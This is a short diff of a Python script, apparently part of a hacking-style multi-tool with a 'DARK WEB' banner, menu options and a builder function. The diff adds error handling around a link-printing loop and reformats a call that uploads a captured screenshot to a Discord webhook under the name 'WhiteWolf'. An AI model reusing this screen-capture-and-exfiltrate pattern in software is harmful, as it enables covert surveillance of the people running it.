@@ -649,17 +649,20 @@ while True:
                 ██████╔╝██║  ██║██║  ██║██║  ██╗    ╚███╔███╔╝███████╗██████╔╝
                 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚══════╝╚═════╝  
                 """)
-            for category, content in links.items():
-                print(f"\n--- {category} ---")
+            try:
+                for category, content in links.items():
+                    print(f"\n--- {category} ---")
 
-                for name, url in content.items():
+                    for name, url in content.items():
 
-                    if isinstance(url, dict):
-                        print(f"\n  [{name}]")
-                        for sub_name, sub_url in url.items():
-                            print(f"   - {sub_name} : {sub_url}")
-                    else:
-                        print(f"  - {name} : {url}")
+                        if isinstance(url, dict):
+                            print(f"\n  [{name}]")
+                            for sub_name, sub_url in url.items():
+                                print(f"   - {sub_name} : {sub_url}")
+                        else:
+                            print(f"  - {name} : {url}")
+            except Exception as e:
+                print("Error", e)
 
             time.sleep(10)
         elif discord == "4":
@@ -845,7 +848,11 @@ while True:
                     "file": ("screen.png", io.BytesIO(img_bytes), "image/png")
                 }
 
-                requests.post(webhook, data={"content": "screenshot", "username": "WhiteWolf", "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"}, files=files)
+                requests.post(webhook, data={
+                "content": "screenshot", 
+                "username": "WhiteWolf", 
+                "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
+                }, files=files)
         elif covid == "4":
             builder()
 
